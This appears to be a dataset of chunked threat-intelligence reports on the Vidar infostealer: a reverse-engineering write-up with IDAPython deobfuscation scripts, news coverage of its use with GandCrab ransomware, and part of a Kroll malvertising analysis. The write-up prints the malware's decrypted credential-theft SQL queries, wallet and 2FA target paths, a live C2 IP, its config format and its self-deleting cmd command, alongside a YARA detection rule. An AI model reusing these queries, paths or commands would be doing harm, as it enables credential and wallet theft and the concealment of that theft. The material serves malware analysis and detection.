T1070 – Indicator Removal: File Deletion

Defense Evasion

T1140 – Deobfuscate/Decode Files or Information

Defense Evasion

T1622 – Debugger Evasion

Credential Access

T1539 – Steal Web Session Cookie

Credential Access

T1552.001 – Unsecured Credentials: Credentials In Files

Credential Access

T1555.003 – Credentials from Password Stores: Credentials from Web Browsers

Discovery

T1012 – Query Registry

Discovery

T1016 – System Network Configuration Discovery

Discovery

T1057 – Process Discovery

Discovery

T1082 – System Information Discovery

Discovery

T1083 – File and Directory Discovery

Discovery

T1518 – Software Discovery

Discovery

T1614 – System Location Discovery

Collection

T1005 – Data from Local System

Collection

T1113 – Screen Capture

Collection

T1119 – Automated Collection

Collection

T1132.001 – Data Encoding: Standard Encoding

Command and Control

T1071.001 – Application Layer Protocol: Web Protocols

Command and Control

T1105 – Ingress Tool Transfer

Exfiltration

T1020 – Automated Exfiltration

Exfiltration"|data_input/vidar_reports/entry_869869ff-7902-4b73-9708-991d9447a50d.text|8221fa678bf540b9b120cd57261c5356
"Command and Control

T1105 – Ingress Tool Transfer

Exfiltration

T1020 – Automated Exfiltration

Exfiltration

T1041 – Exfiltration Over C2 Channel

Table 2. MITRE ATT&CK TTPs related to Stealc infostealer Subscribe to our newsletters Thank you for reading this blogpost. You can also consult other results of surveys carried out by our analysts on the ecosystem of infostealers : Comments are closed.

17/17"|data_input/vidar_reports/entry_869869ff-7902-4b73-9708-991d9447a50d.text|aa7b54f47c4742a39862dd4b447898a2
"Deep Analysis of Vidar Information Stealer eln0ty.github.io/malware analysis/vidar/ February 6, 2022

17 minute read Vidar (forked from Arkei info stealer) is very popular info stealer written in C++. What does it steal? The malware has all the kinds of classic features of stealers: Stealing browser Data (auto-fill, history, cookies - credit cards) Stealing Crypto mining wallets Stealing data from 2FA software like Authy Searching for specific documents Telegram notifications Screenshot Get a complete snapshot of all information of the computer victim Vidar’s clients have access to a C2 Shop portal where they are able to generate their own payloads. So there is no management on their side. For this in-depth analysis, I will inspect the 49.7 version of Vidar. Before starting, I want to thank my friend @_ n1ghtw0lf because he helped me a lot to write this report.. Let’s start ^_^

Vidar overview SHA256: 532BC078A68683CE70CB765191A128FADEE2A23180B1A8E8A16B72F1A8EE291A I will give a brief overview of how Vidar operates then I will go into details in the upcoming sections. This is the basic config from Hatching sandbox.

Vidar collects All important data from victim’s device then Uploads them to C2 server and delete these files from the device with taskkill.exe

1/29

The collection will be something like that (I got it from sandbox so I lost some data because sandbox doesn’t contain everything) compress them in .zip file to be ready for uploading."|data_input/vidar_reports/entry_cad1d9d0-ed84-4e69-9ab5-afeb41388db4.text|2be969056b0c4b32a456b144dbb18793
"You can watch this video which describes the operation from server side.

Sample Preparation (strings & dlls) I faced some problems in my sample, all strings are encrypted and dlls are dynamic allocated.

Vidar tries to decrypt it with the first function before starting any process.

2/29

Decrypt strings The encryption algorithm is pretty easy and straight forward. We just do text = xor(key, cipher) for every encrypted text by automating it with IDAPython. This is the script for the mission. “Every section of the code has a comment to make it readable for you”

3/29

import idc def dec_str(key, data, length): res = bytearray() for i in range(length): res.append(key[i] ^ data[i]) return res.decode() start = 0x401301 end = 0x4031E5 ea = start addrs = [] dec = '' key = b'' data = b'' length = 0 while ea <= end: # check if opperand is immediate if idc.get_operand_type(ea, 0) == idc.o_imm: addrs.append((idc.get_operand_value(ea, 0))) # get key, data, length if len(addrs) == 3: length = addrs[0] data = idc.get_bytes(addrs[1], length) key = idc.get_bytes(addrs[2], length) addrs = [] # comment decrypted string if idc.print_insn_mnem(ea) == ""call"": dec = dec_str(key, data, length) idc.set_cmt(ea, dec, 1) if (idc.print_insn_mnem(ea) == ""mov"") and (idc.get_operand_type(ea, 0) == idc.o_mem) and (idc.get_operand_type(ea, 1) == idc.o_reg): global_var = idc.get_operand_value(ea, 0) idc.set_name(global_var, ""STR_"" + dec, SN_NOWARN)

# move to next instruction ea = idc.next_head(ea, end)"|data_input/vidar_reports/entry_cad1d9d0-ed84-4e69-9ab5-afeb41388db4.text|af1a4dce5ea84a999b4c18597c7f92cc
"# move to next instruction ea = idc.next_head(ea, end)

After this step you must see a clear plain text. Here you are the results: Expand to see more INSERT_KEY_HERE JohnDoe HAL9TH api.faceit.com /core/v1/nicknames/ about Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 C:/ProgramData/ .exe :Zone.Identifier 4/29

[ZoneTransfer] ZoneId=2

Windows

ProgramData

RECYCLE.BIN

Config.Msi

System Volume Information

msdownld.tmp

Recovery

Local/Temp

Program Files

Recycle.Bin

All Users

MicrosoftEdge/Cookies

Users/Public

Local/Packages

Local/NuGet

Roaming/WinRAR

Local/Microsoft

Microsoft

fee_estimates

peers

mempool

banlist

governance

mncache

mnpayments

netfulfilled

passwords.txt

Login Data

Cookies

Web Data

/files/Autofill

/files/Cookies

/files/CC

/files/History

/files/Downloads

/files/

/files/Files

hwid

os

platform

profile

user

cccount

fcount

telegram

ver

5/29"|data_input/vidar_reports/entry_cad1d9d0-ed84-4e69-9ab5-afeb41388db4.text|66fce0a593ee4a7bb74504921317c018
"/files/CC

/files/History

/files/Downloads

/files/

/files/Files

hwid

os

platform

profile

user

cccount

fcount

telegram

ver

5/29

vaultcli.dll VaultOpenVault VaultCloseVault VaultEnumerateItems VaultGetItem VaultFree SELECT url FROM moz_places %s/Mozilla/Firefox/profiles.ini /signons.sqlite SELECT encryptedUsername, encryptedPassword, formSubmitURL FROM moz_logins /logins.json formSubmitURL usernameField encryptedUsername encryptedPassword guid SELECT host, name, value FROM moz_cookies SELECT origin_url, username_value, password_value FROM logins SELECT name, value FROM autofill SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards SELECT target_path, tab_url from downloads SELECT url, title from urls SELECT HOST_KEY, is_httponly, path, is_secure, (expires_utc/1000000)-11644480800, name, encrypted_value from cookies C:/Users/ /AppData/Roaming/FileZilla/recentservers.xml <Host> <Port> <User> <Pass encoding=""base64""> Soft: FileZilla /AppData/Roaming/.purple/accounts.xml <protocol> <name> <password> Soft: Pidgin /Thunderbird/Profiles/ C:/Program Files (x86)/Mozilla Thunderbird APPDATA LOCALAPPDATA Thunderbird /files/Telegram /Telegram Desktop/tdata/* D877F783D5D3EF8C* /Telegram Desktop/tdata/ key_datas

6/29

/Telegram Desktop/tdata/D877F783D5D3EF8C/



map



/Telegram Desktop/tdata/D877F783D5D3EF8C/

firefox.exe

plugin



container.exe

update_notifier.exe

Mozilla Firefox

/Mozilla/Firefox/Profiles/

Pale Moon"|data_input/vidar_reports/entry_cad1d9d0-ed84-4e69-9ab5-afeb41388db4.text|711dd8de941544e68521fa83c24ba631
"firefox.exe

plugin



container.exe

update_notifier.exe

Mozilla Firefox

/Mozilla/Firefox/Profiles/

Pale Moon

/Moonchild Productions/Pale Moon/Profiles/

Waterfox

/Waterfox/Profiles/

Cyberfox

/8pecxstudios/Cyberfox/Profiles/

BlackHawk

/NETGATE Technologies/BlackHawk/Profiles/

IceCat

/Mozilla/icecat/Profiles/

K



Meleon

/K



Meleon/

Google Chrome

/Google/Chrome/User Data/

Chromium

/Chromium/User Data/

Kometa

/Kometa/User Data/

Amigo

/Amigo/User Data/

Torch

/Torch/User Data/

Orbitum

/Orbitum/User Data/

Comodo Dragon

/Comodo/Dragon/User Data/

Nichrome

/Nichrome/User Data/

Maxthon5

/Maxthon5/Users/

Sputnik

/Sputnik/User Data/

Epic Privacy Browser

/Epic Privacy Browser/User Data/

Vivaldi

/Vivaldi/User Data/

CocCoc

/CocCoc/Browser/User Data/

URAN

7/29

/uCozMedia/Uran/User Data/

QIP Surf

/QIP Surf/User Data/

Cent Browser

/CentBrowser/User Data/

Elements Browser

/Elements Browser/User Data/

TorBro Browser

/TorBro/Profile/

Suhba Browser

/Suhba/User Data/

Mustang Browser

/Rafotech/Mustang/User Data/

Chedot Browser

/Chedot/User Data/

Brave_Old

/brave/

7Star

/7Star/7Star/User Data/

Microsoft Edge

/Microsoft/Edge/User Data/

360 Browser

/360Browser/Browser/User Data/

QQBrowser

/Tencent/QQBrowser/User Data/

Opera

/Opera Software/Opera Stable/

OperaGX

/Opera Software/Opera GX Stable/

Local State

Cookies

%s_%s.txt

TRUE

FALSE

/Microsoft/Windows/Cookies/Low/

Cookies/IE_Cookies.txt"|data_input/vidar_reports/entry_cad1d9d0-ed84-4e69-9ab5-afeb41388db4.text|f09aa9d5c3d5417185c72b1173c335f5
"OperaGX

/Opera Software/Opera GX Stable/

Local State

Cookies

%s_%s.txt

TRUE

FALSE

/Microsoft/Windows/Cookies/Low/

Cookies/IE_Cookies.txt

/Packages/Microsoft.MicrosoftEdge_8wekyb3d8bbwe/AC/#!001/MicrosoftEdge/Cookies/

Cookies/Edge_Cookies.txt

/files/Wallets

%USERPROFILE%

%DESKTOP%

KERNEL32.DLL

LoadLibraryA

GetProcAddress

VirtualAllocExNuma

gdi32.dll

ole32.dll

8/29

user32.dll

psapi.dll

BCRYPT.DLL

BCryptCloseAlgorithmProvider

BCryptDestroyKey

BCryptOpenAlgorithmProvider

BCryptSetProperty

BCryptGenerateSymmetricKey

BCryptDecrypt

CRYPT32.DLL

CryptUnprotectData

CryptStringToBinaryA

C:/ProgramData/nss3.dll

NSS_Init

NSS_Shutdown

PK11_GetInternalKeySlot

PK11_FreeSlot

PK11_Authenticate

PK11SDR_Decrypt

advapi32.dll

RegOpenKeyExA

RegQueryValueExA

RegCloseKey

RegOpenKeyExW

RegGetValueW

RegEnumKeyExA

RegGetValueA

GetUserNameA

GetCurrentHwProfileA

wininet.dll

InternetCloseHandle

InternetReadFile

HttpSendRequestA

HttpOpenRequestA

InternetConnectA

InternetOpenA

HttpAddRequestHeadersA

HttpQueryInfoA

InternetSetFilePointer

InternetOpenUrlA

InternetSetOptionA

DeleteUrlCacheEntry

CreateCompatibleBitmap

SelectObject

BitBlt

DeleteObject

CreateDCA

9/29

GetDeviceCaps

CreateCompatibleDC

CoCreateInstance

CoUninitialize

GetDesktopWindow

ReleaseDC

GetKeyboardLayoutList

CharToOemA

GetDC

wsprintfA

EnumDisplayDevicesA

GetSystemMetrics

GetModuleFileNameExA

GetModuleBaseNameA

EnumProcessModules

TronLink"|data_input/vidar_reports/entry_cad1d9d0-ed84-4e69-9ab5-afeb41388db4.text|f1a8ce5b667b4ee48adb2a2f294879e0
"CharToOemA

GetDC

wsprintfA

EnumDisplayDevicesA

GetSystemMetrics

GetModuleFileNameExA

GetModuleBaseNameA

EnumProcessModules

TronLink

/Local Extension Settings/ibnejdfjmmkpcnlpebklmnkoeoihofec/CURRENT

/Sync Extension Settings/ibnejdfjmmkpcnlpebklmnkoeoihofec/CURRENT

/Local Extension Settings/ibnejdfjmmkpcnlpebklmnkoeoihofec

/Sync Extension Settings/ibnejdfjmmkpcnlpebklmnkoeoihofec

MetaMask

/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/CURRENT

/Sync Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/CURRENT

/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn

/Sync Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn

BinanceChainWallet

/Local Extension Settings/fhbohimaelbohpjbbldcngcnapndodjp/CURRENT

/Sync Extension Settings/fhbohimaelbohpjbbldcngcnapndodjp/CURRENT

/Local Extension Settings/fhbohimaelbohpjbbldcngcnapndodjp

/Sync Extension Settings/fhbohimaelbohpjbbldcngcnapndodjp

Authenticator

/Local Extension Settings/bhghoamapcdpbohphigoooaddinpkbai/CURRENT

/Sync Extension Settings/bhghoamapcdpbohphigoooaddinpkbai/CURRENT

/Local Extension Settings/bhghoamapcdpbohphigoooaddinpkbai

/Sync Extension Settings/bhghoamapcdpbohphigoooaddinpkbai

Wallets

Plugins



wallet



.dat

/Wallets/

keystore

Ethereum""

/Ethereum/

Electrum

/Electrum/wallets/

ElectrumLTC

/Electrum



LTC/wallets/

Exodus

10/29"|data_input/vidar_reports/entry_cad1d9d0-ed84-4e69-9ab5-afeb41388db4.text|7f9a013d1f504ae48a6c6838aec8576e
"wallet



.dat

/Wallets/

keystore

Ethereum""

/Ethereum/

Electrum

/Electrum/wallets/

ElectrumLTC

/Electrum



LTC/wallets/

Exodus

10/29

/Exodus/ exodus.conf.json window-state.json /Exodus/exodus.wallet/ passphrase.json seed.seco info.seco ElectronCash /ElectronCash/wallets/ default_wallet MultiDoge /MultiDoge/ multidoge.wallet JAXX /jaxx/Local Storage/ file__0.localstorage Atomic /atomic/Local Storage/leveldb/ 000003.log CURRENT LOCK LOG MANIFEST-000001 0000* Binance /Binance/ app-store.json Coinomi /Coinomi/Coinomi/wallets/ *.wallet *.config wallet_path SOFTWARE/monero-project/monero-core /Monero/ SELECT fieldname, value FROM moz_formhistory /files/Soft /files/Soft/Authy /Authy Desktop/Local Storage/ /Authy Desktop/Local Storage/*.localstorage /Opera Stable/Local State Let’s move to the next step…

Building imports Vidar uses LoadLibraryA & GetProcAddress to make a build imports dynamically. The following function is used for this mission.

11/29

But there are no readable APIs. So I wrote an IDAPython script to rename it. The script used the decrypted strings and map them with the functions to get a clear overview. “you can check it with the debugger”

12/29"|data_input/vidar_reports/entry_cad1d9d0-ed84-4e69-9ab5-afeb41388db4.text|a38573e8e52145dc8dc34f72554d3cb2
"12/29

import idc start = 0x49978D end = 0x499B62 ea = start api_names = [] while ea <= end: # get GetProcAddress API name if (idc.print_insn_mnem(ea) == ""mov"") and (idc.get_operand_type(ea, 0) == idc.o_reg) and (idc.get_operand_type(ea, 1) == idc.o_mem): addr = idc.get_operand_value(ea, 1) name = idc.get_name(addr) if name.startswith(""STR_""): api_names.append(name) # assign GetProcAddress result to global var if (idc.print_insn_mnem(ea) == ""mov"") and (idc.get_operand_type(ea, 0) == idc.o_mem) and (idc.print_operand(ea, 1) == ""eax""): addr = idc.get_operand_value(ea, 0) name = api_names.pop(0) idc.set_name(addr, ""API_"" + name[4:]) # move to next instruction ea = idc.next_head(ea, end)

Now you can look and enjoy..

Imported DLLs Here is a list of imported functions:

13/29

Expand to see more

bcrypt.dll

BCryptCloseAlgorithmProvider

BCryptDestroyKey

BCryptOpenAlgorithmProvider

BCryptSetProperty

BCryptGenerateSymmetricKey

BCryptDecrypt

crypt32.dll

CryptUnprotectData

CryptStringToBinaryA

advapi32.dll

RegOpenKeyExA

RegQueryValueExA

RegCloseKey

RegOpenKeyExW

RegGetValueW

RegEnumKeyExA

RegGetValueA

GetUserNameA

GetCurrentHwProfileA

wininet.dll

InternetCloseHandle

InternetReadFile

HttpSendRequestA

HttpOpenRequestA

InternetConnectA

InternetOpenA

HttpAddRequestHeadersA

HttpQueryInfoA

InternetSetFilePointer

InternetOpenUrlA

InternetSetOptionA

DeleteUrlCacheEntry

gdi32.dll

CreateCompatibleBitmap

SelectObject

BitBlt

DeleteObject

CreateDCA"|data_input/vidar_reports/entry_cad1d9d0-ed84-4e69-9ab5-afeb41388db4.text|ff2ba1f8dd384c169aec54690780a110
"InternetOpenUrlA

InternetSetOptionA

DeleteUrlCacheEntry

gdi32.dll

CreateCompatibleBitmap

SelectObject

BitBlt

DeleteObject

CreateDCA

GetDeviceCaps

CreateCompatibleDC

ole32.dll

CoCreateInstance

CoUninitialize

user32.dll

GetDesktopWindow

14/29

ReleaseDC

GetKeyboardLayoutList

CharToOemA

GetDC

wsprintfA

EnumDisplayDevicesA

psapi.dll

GetModuleFileNameExA

GetModuleBaseNameA

EnumProcessModules

Extra DLLs The malware has been observed, upon execution. DLL files are required during the stealing process of different kind of browsers. So it downloads them with connecting to ip: 162.55.213.180 via GET request. They are deleted when task is done. DLL

Description

freebl3.dll

Freebl Library for the NSS (Mozilla Browser)

mozglue.dll

Mozilla Browser Library

msvcp140.dll

Visual C++ Runtime 2015

nss3.dll

Network System Services Library (Mozilla Browser)

softokn3.dll

Mozilla Browser Library

vcruntime140.dll

Visual C++ Runtime 2015

Well, Now our sample is ready to reverse its functionalities. Let’s Continue…

C2 Server C2 IP 162.55.213.180 (real C2) Vidar has 2 profiles with different websites, every profile should have same IP list. IPs delimited with | in each list. So Vidar tries to grep c2 server IP from 1 of them ‘In our case just 1 IP’. you can check profile description First mastodon.online/@prophef1

15/29

Second koyu.space/@prophef2"|data_input/vidar_reports/entry_cad1d9d0-ed84-4e69-9ab5-afeb41388db4.text|e71ded8506cc45ec8368e8f38b9857a1
"15/29

Second koyu.space/@prophef2

Vidar tries to connect with C2 server with it’s hardcoded profile-id to get the right config: 1,1,1,1,1,1,1,1,1,1,250,Default;%DESKTOP%/;/*.txt:/*.dat:/*wallet/*.*:/*2fa/*.*:/*backup/*. *:/*co

Each part have the “;” in delimiter, so let’s dig into it.

How to understand the configuration format In our example, this is the configuration the malware could get from the C2 : First part

16/29

1

Saved password

1

Cookies / AutoFill

1

Wallet

1

Internet History

1

??? – Supposed to be Skype (not implemented)/

1

??? – Supposed to be Steam (not implemented)/

1

Telegram

1

Screenshot

1

Grabber

1

?? ?

250

Max Size (kb)

Default

Name of the profile (also used for archive file into the files repository)

Second part %DESKTOP % –> Selected folder repository where the grabber feature will search recursively (or not) some selected data Third part .txt:/.dat:/wallet/./:/2fa/./:/backup/./:/code/./:/password/./:/auth/./:/google/./:/utc/./:/UTC/./:/crypt/./:/key/. * Fourth part 50

Max Size per file (kb)

true

Collect Recursively

Fifth part movies:music:mp3; This is the exception part, the grabber will avoid those strings if it matches in the files searched recursively in the specific wanted folder.

Folder generation To summarize all kind of possibles files/folders that will be generated for the malicious repository is in fact pretty simple :

17/29

//files

//files//Autofill

//files//CC

//files//Cookies

//files//Downloads"|data_input/vidar_reports/entry_cad1d9d0-ed84-4e69-9ab5-afeb41388db4.text|cacb2addde554867b46878b8c231d95f
"17/29

//files

//files//Autofill

//files//CC

//files//Cookies

//files//Downloads

//files//Files

//files//History

//files//Soft

//files//Soft//Authy

//files//Telegram

//files//Wallets

<- Master folder <- Auto-Fill files <- Credit Cards <- Cookies <- Downloaded data history from browsers <- Profile configs (Archives) <- Browser histories <- Master folder for targeted softwares <- 2FA software <- Telegram messages <- Cryptomining Wallets

General list files

//files/screenshot.jpg

//files/passwords.txt

//files//information.txt

//files//outlook.txt

<- Actual screenshot of the screen <- Passwords consolidated all at once <- Snapshot of the computer setup <- Outlook cardentials

Browsers firefox waterfall Cyberfox BlackHawk IceCat Opera OperaGX Chromium Kometa Amigo Torch orbitum Nichrome Maxthon 5 sputnik CocCoc Uran 7Star QQBrowser CryptoTab Browser Brave Brave old Of course, this list could be longer than this if there are some browsers based on chromium repository.

2 Factor Authentication software (2FA) This technique could be also another door for vulnerabilities because no system is safe and stealing it will be more and more common in the future. So with Vidar, the Authy software is targeted.

18/29

More specifically the SQLite file on the corresponding application on %APPDATA% repository.

So guys don’t fully trust a system even security system. Give your privacy all your care.

Messengers

19/29

outlook"|data_input/vidar_reports/entry_cad1d9d0-ed84-4e69-9ab5-afeb41388db4.text|58be41a6050e4dfc9e6331a0943b4c10
"So guys don’t fully trust a system even security system. Give your privacy all your care.

Messengers

19/29

outlook

Here is the data that Vidar steals : extracted from sandbox machine

Thunderbird Telegram I won’t describe how Vidar steals them because the process (in-depth)is painful and needs another report to explain. :)

Crypto Wallets Eletcrum Exodus ElectronCash MultiDoge JAXX Atomic Binance This list could change if the customer added some additional files to search for specific areas on victim’s machine.

Information log

20/29

to understand how this file is generated with the corresponding API call, breakpoint on these API if you want to take your time to analyze all the step easily. Vidar steals almost all general information about victim machine and save it in inforamtion.txt file like: Date Machine ID GUID HWID Path Work DIR

)

Get the name of the operating system and platform is classic because this is, in fact, a concatenation of two things. First, Vidar check if Windows is 32 or 64-bit, it checks itself if is running on WOW64 with the help of IsWow64Process.

21/29

Second, with RegOpenKeyExA, the value of this registry key is fetched: HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows NT/CurrentVersion/ProductName"|data_input/vidar_reports/entry_cad1d9d0-ed84-4e69-9ab5-afeb41388db4.text|e9839cbc06884a1d8e9e85c2e63db36c
"Second, with RegOpenKeyExA, the value of this registry key is fetched: HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows NT/CurrentVersion/ProductName

Here we can see the some pretty APIs that we decrypted before analysis. Let’s continue our analysis… Windows version Computer Name User Name Display Resolution Display Language Keyboard Languages Local Time TimeZone [Hardware] -> Processor -> CPU Count -> RAM -> VideoCard 22/29

[Processes] Get a snapshot from all processes executed using CreateToolhelp32Snapshot & Process32First & Process32Next

After, checking if it’s a parent process or a child process, Vidar will grab two value of the PROCESSENTRY32 object : th32ProcessID: PID szExeFile: The name of the PE I can’t screen all function here but you can take your time while analyzing it. Let’s continue… [Software] Get list of all installed software on the machine, the value of this registry key is fetched: HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Uninstall

These values are retrieves of each software (DisplayName & DisplayVersion)

23/29

Result You can see into sandbox analysis, the generated information.txt and the whole process and connections.

24/29"|data_input/vidar_reports/entry_cad1d9d0-ed84-4e69-9ab5-afeb41388db4.text|ce8eccbb5822448dbfe57fd831725ac5
"23/29

Result You can see into sandbox analysis, the generated information.txt and the whole process and connections.

24/29

Version: 49.7 Date: Tue Feb 01 04:37:51 2022 MachineID: 90059c37-1320-41a4-b58d-2b75a9850d2f GUID: {e29ac6c0-7037-11de-816d-806e6f6e6963} HWID: 90059c37-1320-41a4-b58d-816d-806e6f6e6963 Path: C:/Users/admin/AppData/Local/Temp/vidar.exe Work Dir: C:/ProgramData/GI3PPKTM8AJDIRUF0RKXBSEQV Windows: Windows 7 Professional [x86] Computer Name: USER-PC User Name: admin Display Resolution: 1280x720 Display Language: en-US Keyboard Languages: English (United States) Local Time: 1/2/2022 4:37:51 TimeZone: UTC-0 [Hardware] Processor: Intel(R) Core(TM) i5-6400 CPU @ 2.70GHz CPU Count: 4 RAM: 3583 MB VideoCard: Standard VGA Graphics Adapter [Processes] ---------- System [4] ------------------------------ csrss.exe [544] - vidar.exe [1988] < ... >

smss.exe [260]

[Software]

VLC media player [3.0.11]

WinRAR 5.91 (32



bit) [5.91.0]

< ... >

Other payloads Vidar can download an executable file and execute it with ShellExecuteA. First Download

25/29

Then Execute

Kill Task Vidar uses taskkill.exe to kill process. So when all the task of the stealer is finally accomplished and cleaned, the stealer needs to erase itself. So first of all, it retrieves its own PID with the help of GetCurrentProcessId.

26/29"|data_input/vidar_reports/entry_cad1d9d0-ed84-4e69-9ab5-afeb41388db4.text|31449005a9df4c96bd40db83f54497f7
"26/29

When the request is finely crafted, Vidar is simply using ShellExecuteA to pop a command shell and execute the task, this erases all trace of the interaction of the payload on the machine and delete all downloaded DLLs.

The full command: ""C:/Windows/System32/cmd.exe"" /c taskkill /im vidar.exe /f & timeout /t 6 & del /f /q ""C:/Users/admin/AppData/Local/Temp/vidar.exe"" & del C:/ProgramData/*.dll & exit

Exfiltration File Generation I can’t understand well how malware generates the file name but It consists from ‘Machine ID + ?? (random digits) + .zip ‘

27/29

This at least, all the different Content-Disposition that will be added to the HTTP request. hwid

Hardware ID

os

Operating System

platform

32 or 64 bits System

profile

C2 Profile ID

user

Name of the victim account

cccount

Number of Credit Cards stolen

ccount

Number of Coins Stolen (CryptoWallet)

fcount

Number of files stolen

ver

The version of the Vidar malware

Conclusion Vidar always tries to steal your data as much as it can and its tasks vary from version to another. It was hard and exciting and I want to mention “This is my first Tech. report” and I will write more and more. Finally, Remember you can watch the video that I passed in the intro to see how it works from server side.

28/29"|data_input/vidar_reports/entry_cad1d9d0-ed84-4e69-9ab5-afeb41388db4.text|e612d6cd0bc94a4ab70a4ddfb654d382
"28/29

Yara Rules rule Vidar_Stealer : Vidar { meta: Author = ""eln0ty"" Description = ""Rule to detect Vidar"" Date = ""Feb 5, 2022"" strings: $mz = ""MZ"" $s1 = ""1BEF0A57BE110FD467A"" ascii $s2 = ""Version: %s"" ascii $s3 = ""Date: %s"" ascii $s4 = ""MachineID: %s"" ascii $s5 = ""GUID: %s"" ascii $s6 = ""HWID: %s"" ascii condition: ($mz at 0) and (all of ($s*)) }

29/29"|data_input/vidar_reports/entry_cad1d9d0-ed84-4e69-9ab5-afeb41388db4.text|575ac2f4cdca43e1972746896058d424
"GandCrab Operators Use Vidar Infostealer as a Forerunner bleepingcomputer.com/news/security/gandcrab-operators-use-vidar-infostealer-as-a-forerunner/ Ionut Ilascu

By

Ionut Ilascu

January 7, 2019

10:17 AM

0

Cybercriminals behind GandCrab have added the infostealer Vidar in the process for distributing the ransomware piece, which helps increase their profits by pilfering sensitive information before encrypting the computer files. Following the trails of a malvertising campaign targeting users of torrent trackers and video streaming websites, malware researchers found that Fallout Exploit Kit was used to spread a relatively new infostealer called Vidar, which doubled as a downloader for GandCrab.

1/4

Using a rogue advertising domain, the threat actor triaged by geolocation the visitors of the compromised websites and redirected them to an exploit kit (EK). Fallout was the most active, says Jérôme Segura of Malwarebytes, adding that it pushed Vidar - a commercial threat available for $700 specifically built for stealing passwords and forms from web browsers. It can be configured to grab specific information, like payment card numbers or credentials stored in various applications. The variant examined by Malwarebytes included scraping capabilities for details from ""an impressive selection of digital wallets."""|data_input/vidar_reports/entry_736b1ca2-a6c6-4279-9b58-c2af2ffcb5ac.text|d28c2aa3cd104801bcde164b848969b4
"Once it starts running, Vidar searches for data specified in its configuration along and delivers it to the command and control (C2) server as a ZIP archive, notes Segura.

2/4

Its interface makes it easy for the operator to keep track of the victims, deliver instructions to the malware and check the type of data collected from each infected host.

Downloading GandCrab ransomware Vidar can work as a malware dropper and in the case observed by Malwarebytes the second payload was GandCrab ransomware. ""Within about a minute after the initial Vidar infection, the victim’s files will be encrypted and their wallpaper hijacked to display the note for GandCrab version 5.04.""

5.04 is the latest revision of the ransomware and at the moment there is no possibility to decrypt the files it touches without paying the ransom or getting the decryption key from the threat actor. Users affected by earlier versions of the ransomware can recover their files with a free GandCrab decryption tool that works with v1, v4, and v5 up to v5.02 of the malware.

3/4

Running an infostealer before deploying the ransomware ensures some money for the adversary even if the victim does not pay the ransom. Even if the cybercriminals do not use the stolen data themselves, they can sell it on underground forums. Users with computer files locked by GandCrab should now also consider changing the username/password combinations at least for the critical services and applicatons they're using."|data_input/vidar_reports/entry_736b1ca2-a6c6-4279-9b58-c2af2ffcb5ac.text|5086c82c20c84e699bafb68407dacb4c
"Related Articles: Eternity malware kit offers stealer, miner, worm, ransomware tools BlackCat/ALPHV ransomware asks $5 million to unlock Austrian state Windows 11 KB5014019 breaks Trend Micro ransomware protection New ChromeLoader malware surge threatens browsers worldwide Industrial Spy data extortion market gets into the ransomware game GandCrab Information Stealer Malvertising Ransomware Ionut Ilascu

Ionut Ilascu is a technology writer with a focus on all things cybersecurity. The topics he writes about include malware, vulnerabilities, exploits and security defenses, as well as research and innovation in information security. His work has been published by Bitdefender, Netgear, The Security Ledger and Softpedia. Previous Article Next Article Post a Comment Community Rules You need to login in order to post a comment

Not a member yet? Register Now

You may also like:

4/4"|data_input/vidar_reports/entry_736b1ca2-a6c6-4279-9b58-c2af2ffcb5ac.text|0dbb8cea57574e4dae72523b0425b4c9
"Threat Actors use Google Ads to Deploy VIDAR Stealer kroll.com/en/insights/publications/cyber/threat-actors-google-ads-deploy-vidar-stealer

Kroll has observed threat actors abusing Google Ads to deploy malware masquerading as legitimate downloads or software that has been “cracked” or modified to remove or disable features such as copy protection or adware. As part of our analysis of this trend and threat, we have identified specifically that VIDAR malware, an information-stealing trojan, is using Google Ads to advertise spoofed domains and redirect users to fraudulent sites or malware downloads. Kroll is currently tracking the use of this tactic by ransomware groups globally, particularly groups that are assessed with medium confidence to be associated with former Conti ransomware affiliates such as Royal, Black Basta, and Hive ransomware operators. While the infection vector is the same, Zloader is typically used to deploy further malicious tooling to gain a foothold within the network during the Intrusion Lifecycle.

1/11"|data_input/vidar_reports/entry_10e0ccc3-1dc1-47b2-802a-4ba8d843f6f1.text|1e475ecf88a4407bbb9c671a6a367e12
"1/11

As an example of Kroll’s findings and analysis into this trend, we discovered a particular Google Ad that, while displaying the legitimate domain of the opensource image editing product GIMP, ultimately redirected the user to a typo-squatted domain, hosting a cloned website containing malicious downloads. This is particularly interesting as the format of the advert is controlled through Google’s Ad framework. The display domain highlighted below is extracted by Google from the target URL provided by the advertiser.

Figure 1: Screenshot of Malicious Ad (Source: Kroll)

Figure 2: Screenshot of the Typo-Squatted Domain (Source: Kroll) The malicious domain gilimp[. ]org appears to have been registered on October 17, 2022, indicating that this advert could have been live for up to 16 days at the time of our analysis.

2/11"|data_input/vidar_reports/entry_10e0ccc3-1dc1-47b2-802a-4ba8d843f6f1.text|ed8b37cbe3af4c3c91aeec678533bc07
"2/11

Figure 3: Whois Record for Typo-Squatted Domain (Source: Kroll) At the time of the investigation, it was no longer possible to access the advertisement (“advert”), and the screenshots available online no longer showed the destination URL of the advert when hovered over to see the first step in the request chain, making it more difficult for Kroll to definitively determine exactly how the threat actor achieved this. Kroll analyzed a binary on the malicious domain that was presented to appear as the GIMP software. The analysis showed that it was in fact VIDAR malware. Our experts were able to determine that the malware was stealing browser cookies and passwords, along with detailed system information, before sending these to a C2 IP address. The IP information for this IP address shows its geolocation as St. Petersburg in the Russian Federation.

3/11

Figure 4: C2 IP Address Information (Source: Kroll)

Most Likely Methodologies The Kroll Cyber Threat Intelligence team tested a number of theories leveraging the Google Ad workflow for how “malvertising” could lead to the deployment of the VIDAR Stealer. Kroll proposed with high confidence the below two most likely scenarios based on completed research to date: 1. A homoglyph attack utilizing international domain name scheme 2. Via manipulation of the tracking template URL option

Homoglyph Attack

4/11"|data_input/vidar_reports/entry_10e0ccc3-1dc1-47b2-802a-4ba8d843f6f1.text|e3219f3839744dc7a0a4f7d5c5d6bdc1
